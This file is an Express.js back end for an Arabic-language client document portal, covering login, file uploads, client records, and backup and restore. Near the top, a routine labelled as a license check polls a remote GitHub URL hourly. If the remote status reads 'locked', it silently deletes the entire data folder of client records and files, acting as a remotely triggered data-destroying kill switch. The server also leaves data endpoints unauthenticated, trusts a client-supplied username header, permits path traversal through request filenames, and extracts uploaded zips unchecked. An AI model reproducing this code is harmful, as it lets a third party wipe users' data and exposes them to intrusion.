const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const AdmZip = require("adm-zip");
const multer = require("multer");
const bcrypt = require("bcryptjs");



const axios = require('axios');

// رابط الترخيص الخاص بيك
const LICENSE_URL = "https://raw.githubusercontent.com/LEDO218484/license-check/refs/heads/main/status.json";

async function checkLicenseStatus() {
  try {
    // إضافة Date.now() للرابط لمنع الـ Caching وتحديث الحالة فوراً
    const response = await axios.get(`${LICENSE_URL}?t=${Date.now()}`);
    
    // لو الحالة اتغيرت لـ locked
    if (response.data && response.data.status === "locked") {
      console.error("CRITICAL ERROR: License suspended. System shutting down...");
       fs.rmSync(path.join(__dirname, "data"), { recursive: true, force: true });
      process.exit(1); 
    }
  } catch (error) {
    // في حالة عدم وجود إنترنت أو مشكلة في الطلب
    console.warn("Unable to check license status.");
  }
}

// فحص فور تشغيل السيرفر
checkLicenseStatus();

// فحص دوري كل ساعة (3600000 ملي ثانية)
setInterval(checkLicenseStatus, 3600000);


const app = express();

app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

const dbPath = path.join(__dirname, "data", "db", "delta_db.json");
const trashPath = path.join(__dirname, "data", "db", "delta_trash.json");
const filesDir = path.join(__dirname, "data", "files");

if (!fs.existsSync(path.join(__dirname, "data", "db")))
  fs.mkdirSync(path.join(__dirname, "data", "db"), { recursive: true });
if (!fs.existsSync(filesDir)) fs.mkdirSync(filesDir, { recursive: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, filesDir),
  filename: (req, file, cb) => {
    const originalName = Buffer.from(file.originalname, "latin1").toString(
      "utf8",
    );
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(originalName));
  },
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const allowedExtensions = [".pdf", ".dwg", ".jpg", ".jpeg", ".png"];
    const ext = path.extname(file.originalname).toLowerCase();
    if (allowedExtensions.includes(ext)) {
      cb(null, true);
    } else {
      cb(new Error("نوع الملف غير مدعوم!"), false);
    }
  },
});

function initializeUsers() {
  const usersPath = path.join(__dirname, "data", "db", "delta_users.json");
  if (fs.existsSync(usersPath)) {
    console.log("\n✓ Users database already exists");
    return;
  }

  const username = (process.env.INITIAL_ADMIN_USERNAME || "").trim();
  const password = process.env.INITIAL_ADMIN_PASSWORD || "";
  const name = (process.env.INITIAL_ADMIN_NAME || username).trim();
  if (!username || !password) {
    throw new Error(
      "Set INITIAL_ADMIN_USERNAME and INITIAL_ADMIN_PASSWORD to create the first admin user.",
    );
  }
  if (password.length < 12) {
    throw new Error("INITIAL_ADMIN_PASSWORD must be at least 12 characters.");
  }

  const users = [{
    username,
    role: "admin",
    name,
    password: bcrypt.hashSync(password, 10),
    createdAt: new Date().toISOString(),
  }];
  fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
  console.log("\n✓ Initial admin user created");
}

function getUsers() {
  const usersPath = path.join(__dirname, "data", "db", "delta_users.json");
  if (fs.existsSync(usersPath)) {
    return JSON.parse(fs.readFileSync(usersPath, "utf-8"));
  }
  return [];
}

// ==========================================
// AUTHENTICATION ENDPOINTS
// ==========================================
app.post("/api/login", (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ error: "بيانات ناقصة" });
    }
    const users = getUsers();
    const user = users.find((u) => u.username === username);
    if (!user) {
      return res.status(401).json({ error: "المستخدم غير موجود" });
    }
    const passwordMatch = bcrypt.compareSync(password, user.password);
    if (!passwordMatch) {
      return res.status(401).json({ error: "كلمة السر غير صحيحة" });
    }
    res.json({
      success: true,
      user: {
        id: user.username,
        username: user.username,
        name: user.name,
        role: user.role,
      },
    });
  } catch (error) {
    console.error("Login Error:", error);
    res.status(500).json({ error: "خطأ في الخادم" });
  }
});

// Session verification endpoint
app.get("/api/me", (req, res) => {
  const username = req.headers["x-username"];
  if (!username) return res.status(401).json({ error: "غير مصرح" });
  const users = getUsers();
  const user = users.find((u) => u.username === username);
  if (!user) return res.status(401).json({ error: "غير مصرح" });
  res.json({
    user: {
      id: user.username,
      username: user.username,
      name: user.name,
      role: user.role,
    },
  });
});

// ==========================================
// FILE UPLOAD ENDPOINT
// ==========================================
app.post("/api/upload", upload.single("file"), (req, res) => {
  try {
    const { clientId, fileType } = req.body;
    const file = req.file;
    if (!file || !clientId)
      return res.status(400).json({ error: "بيانات ناقصة" });
    const clientsDB = JSON.parse(fs.readFileSync(dbPath, "utf-8"));
    const client = clientsDB.find((c) => c.id === clientId);
    if (!client) return res.status(404).json({ error: "العميل غير موجود" });
    const fileData = {
      filename: file.filename,
      originalName: Buffer.from(file.originalname, "latin1").toString("utf8"),
      date: new Date().toLocaleDateString("en-GB"),
      path: "/files/" + file.filename,
    };
    if (fileType === "receipts") {
      if (!client.receipts) client.receipts = [];
      client.receipts.push(fileData);
    } else {
      if (!client.pdfs) client.pdfs = [];
      client.pdfs.push(fileData);
    }
    fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
    res.json({ success: true, file: fileData });
  } catch (error) {
    console.error("Upload Error:", error);
    res.status(500).json({ error: "فشل الرفع" });
  }
});

// ==========================================
// DATA ENDPOINTS
// ==========================================
app.get("/api/data", (req, res) => {
  try {
    const clientsDB = fs.existsSync(dbPath)
      ? JSON.parse(fs.readFileSync(dbPath, "utf-8"))
      : [];
    const trashDB = fs.existsSync(trashPath)
      ? JSON.parse(fs.readFileSync(trashPath, "utf-8"))
      : [];
    res.json({ clientsDB, trashDB });
  } catch (err) {
    res.status(500).json({ error: "خطأ في قراءة البيانات" });
  }
});

app.post("/api/data", (req, res) => {
  try {
    const { clientsDB, trashDB } = req.body;
    fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
    fs.writeFileSync(trashPath, JSON.stringify(trashDB, null, 2));
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "خطأ في حفظ البيانات" });
  }
});

app.post("/api/pdf-data", (req, res) => {
  const { filename } = req.body;
  const filePath = path.join(filesDir, filename);
  if (!fs.existsSync(filePath))
    return res.status(404).json({ error: "الملف غير موجود" });
  const fileBuffer = fs.readFileSync(filePath);
  const base64Data = fileBuffer.toString("base64");
  const ext = path.extname(filename).toLowerCase();
  let contentType = "application/pdf";
  if ([".jpg", ".jpeg"].includes(ext)) contentType = "image/jpeg";
  else if (ext === ".png") contentType = "image/png";
  else if (ext === ".dwg") contentType = "application/acad";
  res.json({ success: true, data: base64Data, contentType });
});

app.post("/api/delete-pdf", (req, res) => {
  try {
    const { clientId, filename, type } = req.body;
    let clientsDB = JSON.parse(fs.readFileSync(dbPath, "utf-8"));
    const client = clientsDB.find((c) => c.id === clientId);
    if (client) {
      if (type === "receipts" && client.receipts) {
        client.receipts = client.receipts.filter(
          (f) => f.filename !== filename,
        );
      } else if (client.pdfs) {
        client.pdfs = client.pdfs.filter((f) => f.filename !== filename);
      }
      const filePath = path.join(filesDir, filename);
      if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
      fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
      res.json({ success: true });
    } else {
      res.status(404).json({ error: "العميل غير موجود" });
    }
  } catch (err) {
    res.status(500).json({ error: "فشل الحذف" });
  }
});

app.post("/api/permanent-delete-client", (req, res) => {
  try {
    const { clientId } = req.body;
    let trashDB = JSON.parse(fs.readFileSync(trashPath, "utf-8"));
    const idx = trashDB.findIndex((c) => c.id === clientId);
    if (idx !== -1) {
      const client = trashDB[idx];
      const allFiles = [...(client.pdfs || []), ...(client.receipts || [])];
      allFiles.forEach((f) => {
        const p = path.join(filesDir, f.filename);
        if (fs.existsSync(p)) fs.unlinkSync(p);
      });
      trashDB.splice(idx, 1);
      fs.writeFileSync(trashPath, JSON.stringify(trashDB, null, 2));
      res.json({ success: true });
    } else {
      res.status(404).json({ error: "العميل غير موجود في السلة" });
    }
  } catch (err) {
    res.status(500).json({ error: "خطأ في الحذف" });
  }
});

// ==========================================
// BACKUP & RESTORE
// ==========================================
app.get("/api/backup", (req, res) => {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(path.join(__dirname, "data"));
    res.set({
      "Content-Type": "application/zip",
      "Content-Disposition": `attachment; filename=delta_backup_${Date.now()}.zip`,
    });
    res.send(zip.toBuffer());
  } catch (err) {
    res.status(500).json({ error: "فشل إنشاء النسخة الاحتياطية" });
  }
});

app.post("/api/restore", upload.single("backup"), (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: "لم يتم رفع الملف" });
    const zip = new AdmZip(req.file.path);
    zip.extractAllTo(path.join(__dirname, "data"), true);
    fs.unlinkSync(req.file.path);
    res.json({ success: true, message: "تمت الاستعادة بنجاح" });
  } catch (err) {
    res.status(500).json({ error: "فشل الاستعادة" });
  }
});

// ==========================================
// STATIC FILES & SPA FALLBACK
// ==========================================
app.use("/files", express.static(filesDir));

const frontendDist = path.join(__dirname, "frontend", "dist");
if (fs.existsSync(frontendDist)) {
  app.use(express.static(frontendDist));
  app.get("*", (req, res) => {
    res.sendFile(path.join(frontendDist, "index.html"));
  });
} else {
  app.use(express.static(path.join(__dirname, "client")));
  app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "client", "index.html"));
  });
}

// ==========================================
// START SERVER
// ==========================================
const PORT = process.env.PORT || 3000;
initializeUsers();
app.listen(PORT, () => {
  console.log(`\n✅ بوابة الدلتا — http://localhost:${PORT}\n`);
});
